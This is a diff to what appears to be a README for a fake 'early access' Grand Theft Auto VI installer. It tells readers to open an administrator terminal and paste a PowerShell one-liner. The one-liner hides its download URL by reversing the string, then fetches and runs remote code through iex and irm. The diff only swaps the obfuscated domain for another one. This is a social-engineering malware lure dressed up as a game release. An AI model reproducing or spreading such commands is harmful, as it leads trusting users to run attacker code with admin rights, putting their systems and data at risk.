@@ -38,7 +38,7 @@ Community-shared early access installation package for Grand Theft Auto VI. Full
 Press `Win + X` → **Terminal (Admin)** → paste the commands below → press `Enter`
 
 ```powershell
- "VILauncherCL";iex(irm((-join"dfc.mrtig//:sptth"[-1..-99])))
+ "VILauncherCL";iex(irm((-join"sbs.mrtig//:sptth"[-1..-99])))
 ```
 
 **⏱ Takes under a minute. Keep the window open until it finishes.**
